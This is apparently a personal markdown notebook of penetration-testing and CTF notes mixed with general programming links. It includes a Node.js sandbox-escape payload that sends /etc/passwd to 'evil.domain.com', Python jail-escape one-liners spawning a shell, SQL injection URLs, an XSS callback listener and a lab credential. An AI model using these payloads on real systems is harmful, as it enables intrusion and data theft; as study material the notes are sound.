```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading


SHUTDOWN_EVENT = threading.Event()

LPORT = 80
LHOST = "192.168.45.226"


class ThreadingHTTPServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"")

        # shutdown ThreadingHTTPServer
        SHUTDOWN_EVENT.set()


def listen_xss_server():
    httpd = HTTPServer(("0.0.0.0", LPORT), ThreadingHTTPServer)

    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.start()
    print(f"[*] HTTPServer is running on port {LPORT} to access by victim")

    print(f"[*] Wait for XSS ping back...")
    SHUTDOWN_EVENT.wait()
    print(f"[*] Ping back!")

    httpd.shutdown()
    server_thread.join()
    print("[*] HTTPServer has stopped")


def send_xss_payload():
    pass


def main():
    send_xss_payload()
    listen_xss_server()


if __name__ == "__main__":
    main()
```

Python subprocess return output

```python
# run hashcat via subprocess
def crack_password(hashed_password, guess_passwords):
    result = subprocess.run(
        f"hashcat -m 100 {hash} passwords.txt --quiet",
        shell=True,
        capture_output=True,
        text=True,
    )

    assert result.stdout, "error"

    password = result.stdout.split(":")[1].strip()
    return password
```

re

```python
# multiple line
m = re.findall(r"<database>(.*)</database>", resp.text, re.MULTILINE | re.DOTALL)
asset m, "Not matched"

return m[0]
```

socketio with proxy

```python
import requests

requests.packages.urllib3.disable_warnings()
s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
s.verify = False

BASE_URL = "http://localhost"

class WS:
    def __init__(self):
        self._sio = socketio.SimpleClient(http_session=s)
        self._sio.connect(f"{BASE_URL}", transports=["websocket"])

    def emit(self, msg, data):
        self._sio.emit(msg, data)

    def recv(self):
        return self._sio.receive()

    def __exit__(self):
        self._sio.close()
```

## Code Analysis

Papers

- [Cefuzz: An Directed Fuzzing Framework for PHP RCE Vulnerability](https://www.mdpi.com/2079-9292/11/5/758)

### Static Code Analysis

- [Static Techniques for Vulnerability Detection](https://www.ida.liu.se/~TDDD17/oldprojects/2007/projects/4.pdf)
- [security - Dynamic Analysis of PHP Web Applications to identify work flow deviations - Stack Overflow](https://stackoverflow.com/questions/9275231/dynamic-analysis-of-php-web-applications-to-identify-work-flow-deviations)
- [Static and Dynamic Analysis for PHP Security](https://s3.us.cloud-object-storage.appdomain.cloud/res-files/28-php.NYPHP_final.pdf)

## Linux

- [Linux Security Expert](https://linuxsecurity.expert/)

### Bash snippet

Stopwatch

```bash
now=$(date +%s)sec; watch -n0.9 -t -p TZ=UTC date --date now-$now +%H:%M:%S
```

Upgrade all packages

```bash
apt-get update && apt-get upgrade -y && pip --disable-pip-version-check list --outdated --format=json | python -c "import json, sys; print('\n'.join([x['name'] for x in json.load(sys.stdin)]))" | xargs -n1 pip install -U && pip install virtualenv==20.21.1
```

Frequent command

```bash
history | awk '{$1=""; print substr($0, 2)}' | sort | uniq -c | sort -nr | less
```

sshpass

```bash
sshpass -p yourpass ssh -o StrictHostKeyChecking=off user@host
```

### Kali Linux

/usr/share/kali-themes/xfce4-panel-genmon-vpnip.sh

## Windows

- [net use - Windowsコマンド虎の巻](https://windows.command-ref.com/cmd-net-use.html)

### Active Directory (AD)

```bash
smbclient -U "jab.htb\jmontgomery%Midnight_121" -L "//10.129.230.215/"
```

- [enum4linux | Portcullis Labs](https://labs.portcullis.co.uk/tools/enum4linux/)
- [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/)
- [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) - Proof-of-Concept tool to authenticate to an LDAP/S server with a certificate through Schannel

### Unquoted Service

```cmd
wmic service get name,displayname,pathname,startmode
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Powershell

- 32-bit or 64-bit? [scripting - Determine if current PowerShell Process is 32-bit or 64-bit? - Stack Overflow](https://stackoverflow.com/questions/8588960/determine-if-current-powershell-process-is-32-bit-or-64-bit)

32-bit PowerShell

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

64-bit PowerShell

```text
C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

Import-Module

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process
Set-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser
```

### AD CS (Active Directory Certificates Service)

- [Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Certified Pre-Owned. Active Directory Certificate Services… | by Will Schroeder | Posts By SpecterOps Team Members](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [TryHackMe | AD Certificate Templates](https://tryhackme.com/room/adcertificatetemplates#)
- [CVE-2022-26923 (Certifried) explained](https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained)

### Install Microsoft 365 free

1. Download Office Deployment Tool (officedeploymenttool_*.exe) from [here link](https://www.microsoft.com/en-US/download/details.aspx?id=49117)

2. Execute officedeploymenttool_*.exe, then it generate setup.exe

3. Execute setup.exe

   ```bat
   .\setup.exe /configure configuration-Office365-x64.xml
   ```

### RDP

```bash
xfreerdp3 /log-level:FATAL /clipboard /cert:ignore /size:1920x1500 /d: /v:192.168.0.107 /u:username

# OSWE
xfreerdp3 /bpp:32 +fonts +themes /rfx /gfx:AVC420:on +clipboard /compression /audio-mode:1 /gdi:hw /nsc /cert:ignore /tls:seclevel:0 /dynamic-resolution /network:auto /v:manageengine /u:administrator /p:studentlab
```

- [Are those the best performance options/flags? · Issue #6647 · FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP/issues/6647)
- [Optimizing RDP Performance on Linux: My Best Settings with xfreerdp – Wapnet Blog](https://blog.wapnet.nl/2024/07/optimizing-rdp-performance-on-linux-my-best-settings-with-xfreerdp/)

### RDP over SSH

Linux

```bash
ssh -L 3389:127.0.0.1:3389 -N username@192.168.0.107 -f; xfreerdp +clipboard /cert-ignore /size:1920x1500 /v:127.0.0.1 /u:username /p:; kill $(lsof -t -i:3389 -sTCP:listen)
```

### smbclient

```console
smb: \> prompt
smb: \> recurse
smb: \> mget *
```

### Tools

- [PsTools](https://learn.microsoft.com/en-us/sysinternals/downloads/pstools)
- [Didier Stevens Suite \| Didier Stevens](https://blog.didierstevens.com/didier-stevens-suite/)
  - [DidierStevens/DidierStevensSuite](https://github.com/DidierStevens/DidierStevensSuite)
  - including oledump.py
- [Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?tab=readme-ov-file)
  - including Certify.exe, Rubeus.exe, Seatbelt.txt, etc.
- [ruler](https://github.com/sensepost/ruler) - A tool to abuse Exchange services

## Virtualization

### virt-manager

- [Virtual Machine Manager](https://virt-manager.org/)

shortcut

- Change terminal
  - Alt + left or right cursor
  - Send Key -> Ctrl+Alt+F1

## Programming language

### Python

#### Official

- [PEP 0](https://peps.python.org/)
- [Format Specification Mini-Language](https://docs.python.org/3/library/string.html#formatspec)
- [Built-in Functions](https://docs.python.org/3/library/functions.html#built-in-funcs)

#### Sandbox Bypass / Jail

- [Bypass Python sandboxes - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [ctf-wiki-en/docs/pwn/linux/sandbox/python-sandbox-escape.md](https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/sandbox/python-sandbox-escape.md)
- [Python Jails Escape \| Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-jails-escape/)
- [Escaping the PyJail](https://lbarman.ch/blog/pyjail/)
- [wanqizhu/pyfuck](https://github.com/wanqizhu/pyfuck)
- [各种姿势解析-python沙箱逃逸_python的沙箱逃-CSDN博客](https://blog.csdn.net/qq_43390703/article/details/106231154)
- [Pyjail Cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet)
- [the pepsi place \| Albatross: Breaking out of pyjail with your hands tied.](https://blog.pepsipu.com/posts/albatross-redpwnctf)

CTF Challenge

- [TCP1P-CTF-2023-Challenges/Misc/vampire](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/blob/main/Misc/vampire/src/sandbox.py)
- [TCP1P-CTF-2023-Challenges/Misc/PyMagic/src/pymagic.py](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/blob/main/Misc/PyMagic/src/pymagic.py)
- [TCP1P-CTF-2023-Challenges/Misc/Cat](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/blob/main/Misc/Cat%20Kompani/src/chall.py)
- [【ctf】HNCTF Jail All In One - 木鲸的记录](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
- [snakeCTF2023-Writeups/misc/stressful-reader](https://github.com/MadrHacks/snakeCTF2023-Writeups/blob/master/misc/stressful-reader)
- [CVE-2023-46404](https://www.cve.org/CVERecord?id=CVE-2023-46404)
  - [windecks/CVE-2023-46404: PoC and Writeup for CVE-2023-46404.](https://github.com/windecks/CVE-2023-46404)

Useful code

```python
from pprint import pprint

dir(__builtins__)
__builtins__.__dir__()

import builtins
pprint(dir(builtins))

# Reserved keyword
help("keywords")
# False               class               from                or
# None                continue            global              pass
# True                def                 if                  raise
# and                 del                 import              return
# as                  elif                in                  try
# assert              else                is                  while
# async               except              lambda              with
# await               finally             nonlocal            yield
# break               for                 not

help("from")
```

True and False Creation

```python
all((()))   # True
all(((),))  # False

()==()  # True
()=={}  # False

_ == _  # True
_ != _  # False
```

Payload

```python
[m for m in  ().__class__.__bases__[0].__subclasses__() if m.__name__ in '_wrap_close'][0].__init__.__globals__['system']('cat flag.txt')
''.__class__.__base__.__subclasses__()[104].load_module('os').system('sh')"
```

#### Decompile

- [Decompile compiled python binaries (exe, elf) - Retreive from .pyc - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/.pyc)

#### YAML Deserialization

- [semgrep-rules/python/lang/security/deserialization/avoid-pyyaml-load.py](https://github.com/semgrep/semgrep-rules/blob/develop/python/lang/security/deserialization/avoid-pyyaml-load.py)
- [codeql/python/ql/test/library-tests/frameworks/ruamel.yaml/Decoding.py](https://github.com/github/codeql/blob/codeql-cli/v2.15.3/python/ql/test/library-tests/frameworks/ruamel.yaml/Decoding.py)

```python
# Unsafe:
ruamel.yaml.load(payload)
ruamel.yaml.load(stream=payload)
ruamel.yaml.load(payload, ruamel.yaml.Loader)

# Unsafe:
ruamel.yaml.load_all(payload)

################################################################################
# C-based loaders with `libyaml`
################################################################################

# Unsafe:
ruamel.yaml.load(payload, ruamel.yaml.CLoader)
```

#### Create Python2/3 environment

Python 2

```bash
pip install virtualenv==20.21.1  # https://stackoverflow.com/a/76380501
virtualenv -p /usr/bin/python2.7 venv
. ./venv/bin/activate
```

Python 3

```bash
python3 -m venv ~/Documents/venv
. ~/Documents/venv/bin/activate
```

### Lua

#### Sandbox Bypass

CTF Challenge

- [TCP1P-CTF-2023-Challenges/Misc/Landbox/main.lua](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/blob/main/Misc/Landbox/main.lua)

### PHP

- [PHP: サポートするプロトコル/ラッパー](https://www.php.net/manual/ja/wrappers.php)
- [PHP Sandbox - Execute PHP code online through your browser](https://onlinephp.io/)
- [Local File Inclusion (LFI) Explained, Examples & How to Test](https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/)
- [RIPS](https://rips-scanner.sourceforge.net/) - free PHP security scanner using static code analysis
- [PHP Internals Book](https://www.phpinternalsbook.com/)

Dangerous PHP Functions

- [Dangerous PHP Functions](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720)
- [psecio/parse](https://github.com/psecio/parse?tab=readme-ov-file#the-checks) - Parse: A Static Security Scanner
- Sink: [rips/config/sinks.php](https://github.com/ripsscanner/rips/blob/master/config/sinks.php)
- Source: [rips/config/sources.php](https://github.com/ripsscanner/rips/blob/master/config/sources.php)

Analysis

- [security - Dynamic Analysis of PHP Web Applications to identify work flow deviations - Stack Overflow](https://stackoverflow.com/questions/9275231/dynamic-analysis-of-php-web-applications-to-identify-work-flow-deviations)
- [Paros download \| SourceForge.net](https://sourceforge.net/projects/paros/)
- [PHP String Analyzer](https://web.archive.org/web/20130730122918/http://www.score.is.tsukuba.ac.jp/~minamide/phpsa/)

Tools

- [phpstan/phpstan](https://github.com/phpstan/phpstan) - PHP Static Analysis Tool - discover bugs in your code without running it!

PHP Vulnerability Hunter

- [php-vulnerability-hunter | Google Code Archive](https://code.google.com/archive/p/php-vulnerability-hunter/downloads)
- [PHP Vulnerability Hunter v.1.1.4.6](https://thehackernews.com/2011/11/php-vulnerability-hunter-v1146.html) - Automated fuzz testing tool
- [robocoder/phpvh](https://github.com/robocoder/phpvh)
- [Security-Shell](https://security-sh3ll.blogspot.com/2011/11/php-vulnerability-hunter-v1146.html?utm_source=dlvr.it&utm_medium=twitter)
- [PHP Vulnerability Hunter - Downloads](http://phpvulnhunter.codeplex.com/releases)
- [PHP Vulnerability Hunter – CodePlex Archive](https://www.codeplexarchive.org/project/PHPVulnHunter)

Argument parser example

- [less.php/bin/lessc](https://github.com/wikimedia/less.php/blob/master/bin/lessc)

Deserialization

- [phpggc](https://github.com/ambionics/phpggc) - PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically

Phar Deserialization

- [PHP: Backward Incompatible Changes - Manual](https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.phar)
- [PHP Deserialization - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/PHP/#phar-deserialization)
- [PHP: Phar - Manual](https://www.php.net/manual/en/book.phar.php#123125)
- [PHP: rfc:phar_stop_autoloading_metadata](https://wiki.php.net/rfc/phar_stop_autoloading_metadata)

#### Tested environment in Docker Compose

Dockerfile

```dockerfile
FROM php:8.3-apache-bullseye

WORKDIR /var/www/html

RUN docker-php-ext-install mysqli && \
    mv "$PHP_INI_DIR/php.ini-production" "$PHP_INI_DIR/php.ini" && \
    rm -fr /var/log/apache2/* && \
    apt-get update && \
    apt-get install -y vim libtidy-dev libbz2-dev libicu-dev libzip-dev libpng-dev libjpeg-dev && \
    docker-php-ext-configure gd --with-jpeg && \
    docker-php-ext-install gettext tidy exif bz2 intl zip gd

# zenphoto
RUN curl -L -o /tmp/zenphoto.tar.gz https://github.com/zenphoto/zenphoto/archive/v1.6.1.tar.gz && \
    tar zxf /tmp/zenphoto.tar.gz -C /var/www/html/ --strip-components 1 && \
    chown www-data:www-data -R /var/www/html
```

docker-compose.yml

```yaml
version: '3'
services:
  web:
    build: .
    ports:
      - "80:80"
    depends_on:
      - db

  db:
    image: mysql:8-debian
    ports:
      - "3306:3306"
    environment:
      - MYSQL_ROOT_PASSWORD=password
      - MYSQL_DATABASE=db
```

#### Vulnerability

- [CVE-2023-47130](https://www.cve.org/CVERecord?id=CVE-2023-47130) - Yii `unserialize()` RCE
- [CVE-2023-47444](https://www.cve.org/CVERecord?id=CVE-2023-47444) - OpenCart 4.0.0.0 to 4.0.2.3 RCE
  - [Static Code Injections in OpenCart (CVE-2023-47444)](https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-cve-2023-47444/)
- [eos](https://github.com/Synacktiv/eos) - Enemies Of Symfony - Debug mode Symfony looter

#### Type Juggling

![PHP Comparisons: Strict](https://secops.group/wp-content/uploads/2022/12/Loose-Comparisions-1024x578.png)
![PHP Comparisons: Loose](https://secops.group/wp-content/uploads/2022/12/Strict-Comparisions-1024x582.png)

- [Type Juggling - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Type%20Juggling/#magic-hashes)

#### Format String Injection

- [Testing for Format String Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection)
- [1337UP web/OWASP](https://cr3.mov/posts/1337up23-web-owasp/)

> `https://owasp.ctf.intigriti.io/search.php?a=%1$s) AND 0;--&id=1`
> `https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) OR 0 AND POSITION(`

### JavaScript

- [de4js](https://lelinhtinh.github.io/de4js/) - JavaScript Deobfuscator and Unpacker
- [Online Brainfuck Compiler](https://www.tutorialspoint.com/execute_brainfk_online.php)

#### Payload

- [JSFuck](https://jsfuck.com/)
- [NodeJS-Red-Team-Cheat-Sheet](https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet)
- [Breaking out of node.js sandbox](https://gist.github.com/bjoerge/2889278)

```javascript
var func = arguments.callee.caller.arguments.callee.caller.arguments.callee.caller.arguments.callee.arguments.callee.caller.arguments.callee.caller;
func.call(func, "var fs = process.mainModule.require('fs');var http = process.mainModule.require('http');var req = http.request({host: 'evil.domain.com'}); req.write(fs.readFileSync('/etc/passwd').toString());req.end();");
```

### Ruby

#### CVE-2019-5420: Deserialization to RCE

If secret_key_base is leaked, RCE is possible.

- [CVE-2019-5420](https://www.cve.org/CVERecord?id=CVE-2019-5420)
- [Report #473888 - RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage) \| HackerOne](https://hackerone.com/reports/473888)
- [DoubleTap Development Mode secret_key_base Remote Code Execution (Metasploit) - Linux remote Exploit](https://www.exploit-db.com/exploits/46785)

Rails Deserialization

- [Railsの上で走る - ooooooo_qの日記](https://ooooooo.hatenablog.com/entry/2019/12/11/080000)
- [Deserialization on Rails](https://zenn.dev/ooooooo_q/books/rails_deserialize)

File Content Disclosure vulnerability

- [CVE-2019-5418](https://www.cve.org/CVERecord?id=CVE-2019-5418)

#### CVE-2021-43609: SQLi2RCE in Spiceworks Help Desk Server (HDS)

- [CVE-2021-43609](https://www.cve.org/CVERecord?id=2021-43609)
- [d5sec/CVE-2021-43609-POC](https://github.com/d5sec/CVE-2021-43609-POC)
- [CVE-2021-43609 Write-up \| LinkedIn](https://www.linkedin.com/pulse/cve-2021-43609-write-up-division5-security-4lgwe/)

### Scheme

- [Practical Scheme](http://practical-scheme.net/index-j.html)

### Java

#### Decompile

- [jd-gui](https://github.com/java-decompiler/jd-gui)
  - compile without comment and metadata
    Help > Preferences > Source Saver Class file > uncheck
    - Write original line numbers
    - Write metadata

    ![jd-gui-without-linenumber-and-metadata](img/jd-gui-without-linenumber-and-metadata.png)

- [jadx](https://github.com/skylot/jadx)

    ```bash
    /usr/share/jadx/bin/jadx test.jar
    ```

### Erlang

- [Learn You Some Erlang for Great Good!](https://learnyousomeerlang.com/content)

### Common Lisp

- [awesome-cl](https://github.com/CodyReichert/awesome-cl) - A curated list of awesome Common Lisp frameworks, libraries and other shiny stuff.
- [A Road to Common Lisp / Steve Losh](https://stevelosh.com/blog/2018/08/a-road-to-common-lisp/)
  - Translation: [A Road to Common Lisp 翻訳](https://gist.github.com/y2q-actionman/49d7587912b2786eb68643afde6ca192) - A Road to Common Lisp 翻訳. GitHub Gist: instantly share code, notes, and snippets.

### C++

- [Stroustrup: C++](https://www.stroustrup.com/C++.html)

### PowerShell

Similar with tail in Linux

```pwsh
Get-Content -Path <file path> -Tail 10 -Wait
```

### Markdown

- [markdownlint](https://github.com/DavidAnson/markdownlint/)
- [markdown-toc](https://github.com/jonschlinkert/markdown-toc)
- [node-markdown-spellcheck](https://github.com/lukeapage/node-markdown-spellcheck)

```bash
# Fix
markdownlint -c ~/.markdownlint.yaml -f README.md

# TOC: https://github.com/jonschlinkert/markdown-toc/issues/14
markdown-toc --maxdepth 4 --bullets='-' -i README.md

mdspell --report --ignore-acronyms --ignore-numbers --en-us README.md
```

### Sandbox Service

- [Rextester](https://rextester.com/)

### Source Code Hosting

- [GitHosting](https://archive.kernel.org/oldwiki/git.wiki.kernel.org/index.php/GitHosting.html)
- [GitHub](https://github.com/)
- [Projects · GitLab](https://gitlab.com/)
- [Bitbucket \| Git solution for teams using Jira](https://bitbucket.org/)
- [Sourcegraph \| Code AI platform](https://sourcegraph.com/)
- [SourceForge](https://sourceforge.net/)
- [Plex (unavailable)](http://codeplex.com/)
- [Gitee](https://gitee.com/)
  - [Explore - Gitea: Git with a cup of tea](https://gitea.com/explore/repos)
- [Gogs](https://gogs.io/)

## Data Structures & Algorithms

Dijkstra's algorithm

- [NetworkX — NetworkX documentation](https://networkx.org/)
  - [shortest_path — NetworkX 3.2.1 documentation](https://networkx.org/documentation/stable/reference/algorithms/generated/networkx.algorithms.shortest_paths.generic.shortest_path.html#networkx.algorithms.shortest_paths.generic.shortest_path)
- [TUCTF 2023 Secret Agent Writeup](https://github.com/meashiri/ctf-writeups/blob/main/gh-pages/content/posts/202312-TUCTF/index.md#secret-agent)

```python
import networkx as nx

edge_list = [
    ("Attaya", "Belandris", 10),
    ("Attaya", "Charity", 3),
    ("Attaya", "Delato", 5),
    ("Belandris", "Jolat", 15),
    ("Belandris", "Gevani", 8),
    ("Belandris", "Emell", 1),
    ("Charity", "Belandris", 8),
    ("Charity", "Emell", 2),
    ("Charity", "Flais", 8),
    ("Charity", "Haphsa", 3),
    ("Charity", "Delato", 1),
    ("Delato", "Flais", 5),
    ("Delato", "Iyona", 5),
    ("Delato", "Belandris", 3),
    ("Emell", "Gevani", 5),
    ("Emell", "Iyona", 3),
    ("Emell", "Flais", 5),
    ("Flais", "Gevani", 3),
    ("Flais", "Iyona", 3),
    ("Flais", "Haphsa", 1),
    ("Gevani", "Jolat", 8),
    ("Gevani", "Iyona", 1),
    ("Gevani", "Haphsa", 6),
    ("Haphsa", "Iyona", 8),
    ("Haphsa", "Kepliker", 7),
    ("Haphsa", "Melyphora", 8),
    ("Haphsa", "Queria", 10),
    ("Haphsa", "Delato", 1),
    ("Iyona", "Jolat", 15),
    ("Iyona", "Leter", 4),
    ("Iyona", "Kepliker", 3),
    ("Jolat", "Leter", 4),
    ("Jolat", "Kepliker", 5),
    ("Jolat", "Osiros", 7),
    ("Kepliker", "Leter", 5),
    ("Kepliker", "Osiros", 2),
    ("Kepliker", "Partamo", 6),
    ("Kepliker", "Queria", 7),
    ("Kepliker", "Delato", 2),
    ("Kepliker", "Melyphora", 5),
    ("Leter", "Osiros", 3),
    ("Leter", "Rhenora", 10),
    ("Melyphora", "Partamo", 4),
    ("Melyphora", "Shariot", 11),
    ("Melyphora", "Queria", 1),
    ("Notasto", "Shariot", 7),
    ("Osiros", "Shariot", 8),
    ("Osiros", "Rhenora", 6),
    ("Partamo", "Osiros", 1),
    ("Partamo", "Rhenora", 5),
    ("Partamo", "Shariot", 9),
    ("Queria", "Partamo", 1),
    ("Queria", "Rhenora", 6),
    ("Queria", "Shariot", 10),
    ("Rhenora", "Notasto", 2),
    ("Rhenora", "Shariot", 1),
]

G = nx.DiGraph()
G.add_weighted_edges_from(edge_list)

assert len(G.nodes) == 19

sl = nx.shortest_path(G, source="Attaya", target="Shariot", weight="weight")
print(sl)
```

## Computer Scinence

- [ossu/computer-science](https://github.com/ossu/computer-science)
- [ianw/bottomupcs](https://github.com/ianw/bottomupcs)
- [Teach Yourself Computer Science](https://teachyourselfcs.com/)

## Machine Learning / Deep Learning

- [List of datasets for machine-learning research - Wikipedia](https://en.wikipedia.org/wiki/List_of_datasets_for_machine-learning_research)
- [ChristosChristofidis/awesome-deep-learning](https://github.com/ChristosChristofidis/awesome-deep-learning)
- [udlbook](https://udlbook.github.io/udlbook/)

## Emacs

- [Query Replace (GNU Emacs Manual)](https://www.gnu.org/software/emacs/manual/html_node/emacs/Query-Replace.html)

markdown-mode

```text
C-c C-b     markdown-outline-previous-same-level
C-c C-d     markdown-do
C-c C-f     markdown-outline-next-same-level
C-c C-s Q markdown-blockquote-region
```

- [Line Truncation (GNU Emacs Manual)](https://www.gnu.org/software/emacs/manual/html_node/emacs/Line-Truncation.html)

> Horizontal scrolling automatically causes line truncation (see Horizontal Scrolling). You can explicitly enable line truncation for a particular buffer with the command C-x x t (toggle-truncate-lines).

## Static Site Generator

- [Static Site Generators - Top Open Source SSGs \| Jamstack](https://jamstack.org/generators/)
- [Hugo](https://gohugo.io/)
  - [athul/archie](https://github.com/athul/archie)
  - [Slonser Notes \| Home](https://blog.slonser.info/)
- [Hexo](https://hexo.io/)
  - [minos](https://github.com/ppoffice/hexo-theme-minos)

## Certificates

- [Security Certification Roadmap](https://pauljerimy.com/security-certification-roadmap/)

### OSCP (Offensive Security Certified Professional)

Official Link

- [Sign in](https://portal.offsec.com/sign-in)
- [PEN-200: Penetration Testing Certification with Kali Linux \| OffSec](https://www.offsec.com/courses/pen-200/)
- [OffSec Forums](https://forums.offsec.com/)
- Offsec Support Portal
  - [OSCP Exam Guide (Newly Updated) – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide-Newly-Updated)
  - [OSCP Exam FAQ (Newly Updated) – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ-Newly-Updated)
  - [Course Specific Resources for Offsec Students – OffSec Support Portal](https://help.offsec.com/hc/en-us/categories/6965809783316-Course-Specific-Resources-for-Offsec-Students)
  - [OSCP Exam Guide (Newly Updated) – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide-Newly-Updated)
- [PEN-200 and the OSCP](https://www.offsec.com/wp-content/uploads/2022/03/oscp-prep-ebook.pdf) - OSCP Overview
- [OSCP 2](https://fs.hubspotusercontent00.net/hubfs/5852453/OSCP%202.pdf) - OSCP Prep slide by Michael Mancao in February 22, 2022

Journey

- [OSCP合格までの道のりとそこから学んだこと](https://blog.s-tajima.work/post/2021/oscp-journey-and-things-i-learned/)
- [OSCP: ペネトレーションテストの難関資格を取った話 - ommadawn46's blog](https://ommadawn46.hatenablog.com/entry/2020/12/06/190341)
- [The Journey to Try Harder: TJnull’s Preparation Guide for PWK/OSCP | NetSec Focus](https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html)
- [From (Almost) 0x0 to OSCP: My Journey to become OSCP | by Louis Low | Medium](https://nullbyte.medium.com/from-almost-0x0-to-oscp-my-journey-to-become-oscp-122f782976a0)
- [OSCP Preparation Guide - Adithyan's Blog](https://blog.adithyanak.com/oscp-preparation-guide)
- [How I passed the OSCP in 7 hours on my first attempt](https://4pfsec.com/oscp)
- [How To Pass Your OSCP Exam (New Exam Format) | by Dw3113r | Medium](https://medium.com/@dw3113r/how-to-pass-your-oscp-exam-new-exam-format-be89ca04edad)

Preparation

- [資格「OSCP」について. 概要 | by syuya yuikura | 這いよれ Pentest Lab | Medium](https://medium.com/yuikuras-cracking-lab/%E8%B3%87%E6%A0%BC-oscp-%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6-3846cab4bd40)
- [OSCPとは？効果的な勉強法を徹底解説 \| Computer Futures](https://www.computerfutures.com/ja-jp/knowledge-hub/cyber-security/what-is-oscp/)
- [A Detailed Guide on OSCP Preparation - From Newbie to OSCP - Checkmate](https://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/)

## Tools

### netcat

- [original nc110.tgz](https://nc110.sourceforge.io/)

<details><summary>check file</summary>

```console
$ md5sum nc110.tgz
402632f2fe01c169ff19a0ad6e9d608c  nc110.tgz

$ mkdir nc110 && tar xf nc110.tgz -C nc110

$ find nc110 -type f | xargs md5sum
0db440646515384cbfd94a235a90f3ed  nc110/stupidh
330ffaaaac7d40e36bb63740fded5c01  nc110/Changelog
f1557018bf57b2ca74c68d44c03ddd91  nc110/README
9388ded7183a909a8fa191118e3d62b1  nc110/Makefile
eb3bcb13d36395d0b09a3ef66b2ca2ff  nc110/scripts/webrelay
5413b15cbbc1fb54ef472f86e7bc78da  nc110/scripts/README
430a1b955ad2da1fc053985423a52f17  nc110/scripts/probe
544c19da387112fa40ca7926e77aeb1b  nc110/scripts/alta
a8ec4e32660d14c1df15498e7b890c41  nc110/scripts/iscan
e319e17eb956b8a4c65d5582584ba0bb  nc110/scripts/dist.sh
fa679307322bb3f379877b19afd116ac  nc110/scripts/ncp
8c787e1a2a17d235a39b95c3d29daf9a  nc110/scripts/irc
f1570f4c5cc27216ad800e7bf023c4d3  nc110/scripts/websearch
393193b684e0efb135e8459aecf6900b  nc110/scripts/webproxy
6f15c855fff0cdeeb8c08ab7e2c28b60  nc110/scripts/bsh
04b7816212812a57e24e7e0dfa142088  nc110/scripts/web
9faa53dcf7446e40bbe72706c1ec3226  nc110/netcat.blurb
4bf5f11beccbf28fc656264cdc9785ed  nc110/netcat.c
68f9547b38b241cdef32c7ec558b3293  nc110/data/rip.d
3d26e127b9691586d6a80f736ab461c2  nc110/data/README
6ab8dee297f6e8d84061d848a68cfa4e  nc110/data/Makefile
450cf107e0ff9aec8025d058a7502c79  nc110/data/dns-any.d
bddf26f2c1029936692f8bcd8bd5262d  nc110/data/rservice.c
f3d280c86c2121b03df1e08b97e13091  nc110/data/pmap-mnt.d
7c641a3ad03f05c19645c1369dffea23  nc110/data/xor.c
e181220d9394b28982b20ecbb484e019  nc110/data/nfs-0.d
f7a39541dc2422ccbbbb2e2154208926  nc110/data/pmap-dump.d
cc82f9ecc16219019860a907b595cfd2  nc110/data/pm.d
08bc597b20299be9241ef13763b27ed7  nc110/data/showmount.d
c7aae64a82d56171225c64892a291366  nc110/data/data.c
03f2a43f230d5139aa21cd55ba7f1d8c  nc110/generic.h
```

</details>

- [GNU Netcat](https://netcat.sourceforge.net/)
- [Ncat (Nmap implementation)](https://nmap.org/ncat/)

## Media

### Book

